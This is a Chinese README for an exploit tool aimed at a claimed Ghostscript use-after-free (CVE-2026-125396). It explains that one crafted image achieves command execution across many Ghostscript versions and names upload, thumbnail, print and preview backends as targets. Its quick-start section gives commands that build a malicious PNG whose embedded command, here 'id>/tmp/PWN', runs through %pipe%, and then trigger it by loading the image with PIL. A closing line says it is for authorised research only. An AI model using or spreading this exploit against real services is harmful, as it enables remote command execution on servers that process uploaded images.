# CVE-2026-125396 bomb fuzz exploit

[中文](README.md) | [English](README_EN.md)

**Referer**: https://pwn.ai/upload2shell/research.html

**范围**：Ghostscript < 10.08.0

upload2shell的一个带fuzz的版本，支持64-bit LP64下的fuzz，其他架构没写。

# 省流

这次的是逻辑性uaf，与地址无关，所以可以预先做一个带fuzz的图片，能一次模糊测试大量版本。这才有点24shell的样子。

类似log4j的思路：图片/文档上传、缩略图、打印、预览/导入等都是fuzz面，如果后端用了ghostscript就可以打。

## 快速使用

```bash
# 生成 fuzz 图片：--cmd 控制 %pipe% 命令；引号避免 shell 把 > 当重定向
python3 exp.py --cmd 'id>/tmp/PWN' --out /tmp/exp.png

# 加载并触发
echo 'from PIL import Image
with Image.open("/tmp/exp.png") as image:
    image.load()' | python3

cat /tmp/PWN
# uid=1000(debian) gid=1000(debian) ....
```

---

**仅授权技术研究，一切后果与作者无关。**
